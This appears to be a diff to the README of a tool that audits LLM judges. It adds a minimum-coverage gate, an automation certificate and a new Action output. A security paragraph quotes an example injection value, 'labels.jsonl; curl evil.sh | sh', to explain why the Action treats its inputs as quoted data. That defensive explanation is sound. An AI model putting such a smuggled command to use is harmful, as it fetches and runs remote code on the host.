@@ -13,7 +13,10 @@ pip install "kunko-judge-audit[charts]"  # + HTML reports with charts (matplotli
 ```bash
 judge-audit run labels.jsonl --judge simulated            # audit-report.md, audit-result.json, audit-judgments.jsonl
 judge-audit check labels.jsonl --judge jev --baseline audit-result.json --max-ece-drift 0.02
+judge-audit check labels.jsonl --judge jev --baseline audit-result.json --min-coverage 0.05:0.40
 ```
+
+Every report opens with **"Can I automate this?"**: the share of the labelled traffic the judge can decide alone at a certified error of at most 1, 2, 5 and 10 %, with the confidence threshold to deploy ([judges.md § The automation certificate](judges.md#the-automation-certificate)). `--min-coverage RISK:SHARE` turns it into a gate: exit `1` when, at a certified error of at most RISK, less than SHARE of the decisions can be automated.
 
 Exit codes: `0` ok · `1` drift detected · `2` usage or configuration error. Judges and their environment variables: [judges.md](judges.md). Real vendor runs: [real-audits.md](real-audits.md).
 
@@ -58,6 +61,7 @@ steps:
       baseline: audits/baseline.json           # audit-result.json of the run you signed off
       max-ece-drift: "0.02"
       max-acc-drop: "0.01"
+      min-coverage: "0.05:0.40"                # fail if < 40 % automatable at a certified error ≤ 5 %; '' = no minimum
       fail-on-drift: "true"                    # 'false' = report, expose the `drift` output, do not fail
       allow-incompatible: "false"              # 'true' = compare even if the baseline measured another dataset/judge/n
       upload-evidence: "false"                 # 'true' = also upload the per-decision judgments as an artifact
@@ -66,7 +70,7 @@ steps:
       AI_GATEWAY_API_KEY: ${{ secrets.AI_GATEWAY_API_KEY }}   # jev; llm uses ANTHROPIC_API_KEY or LLM_*
 ```
 
-The markdown report lands in the job summary; on pull requests one comment is created and then updated on every push (marker `<!-- judge-audit:<labels> -->`), with the SIMULATED banner whenever the judge is the simulator. Outputs: `accuracy`, `ece`, `zero-error-coverage`, `n`, `drift`, `report-path`, `result-path`. The report, the result JSON and the drift verdict are uploaded as a run artifact. The per-decision judgments are written on the runner but **not** uploaded unless you set `upload-evidence: "true"` — those rows contain the decisions themselves, and an artifact is readable by everyone who can read the repository.
+The markdown report lands in the job summary; on pull requests one comment is created and then updated on every push (marker `<!-- judge-audit:<labels> -->`), with the SIMULATED banner whenever the judge is the simulator. The comment opens with the automation certificate. Outputs: `accuracy`, `ece`, `zero-error-coverage`, `certified-coverage` (the certified share per target, e.g. `1%=0.0 2%=0.0 5%=0.41 10%=0.7226`), `n`, `drift`, `report-path`, `result-path`. `min-coverage` is matched against a strict `RISK:SHARE` pattern before it reaches the CLI. The report, the result JSON and the drift verdict are uploaded as a run artifact. The per-decision judgments are written on the runner but **not** uploaded unless you set `upload-evidence: "true"` — those rows contain the decisions themselves, and an artifact is readable by everyone who can read the repository.
 
 **The Action treats its inputs as data.** Every input reaches the shell through `env:` and is used quoted; none is interpolated into a script, where a value like `labels.jsonl; curl evil.sh | sh` would be executed rather than read. `mode` is checked against `run | check` before anything runs, `extras` against a character allowlist, and there is no `eval` anywhere. `tests/test_action_yaml.py` fails the build if an `${{ inputs.* }}` ever reappears inside a `run:` block.
 
